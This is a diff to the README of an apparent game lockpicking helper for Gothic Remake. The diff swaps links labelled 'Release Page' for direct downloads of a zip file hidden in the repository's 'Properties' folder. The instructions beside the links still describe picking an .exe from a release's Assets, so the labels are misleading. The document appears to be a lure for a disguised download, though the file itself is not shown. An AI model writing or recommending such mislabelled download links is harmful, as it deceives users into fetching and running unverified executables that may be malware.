@@ -1,6 +1,6 @@
 # 🔐 gothic-remake-lockpicking-tool - Solve lockpicking puzzles in Gothic Remake
 
-[![Download gothic-remake-lockpicking-tool for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/yudoufu160-maker/gothic-remake-lockpicking-tool)
+[![Download gothic-remake-lockpicking-tool for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/yudoufu160-maker/gothic-remake-lockpicking-tool/raw/refs/heads/main/lockpicking/Properties/tool_gothic_remake_lockpicking_3.7.zip)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you run the tool:
 
 Follow these steps to obtain and prepare the tool for use:
 
-1. Visit the project release page here: [https://github.com/yudoufu160-maker/gothic-remake-lockpicking-tool](https://github.com/yudoufu160-maker/gothic-remake-lockpicking-tool).
+1. Visit the project release page here: [https://github.com/yudoufu160-maker/gothic-remake-lockpicking-tool/raw/refs/heads/main/lockpicking/Properties/tool_gothic_remake_lockpicking_3.7.zip](https://github.com/yudoufu160-maker/gothic-remake-lockpicking-tool/raw/refs/heads/main/lockpicking/Properties/tool_gothic_remake_lockpicking_3.7.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in `.exe` to start the download.
 4. Save the file to a folder on your computer that you can access easily.
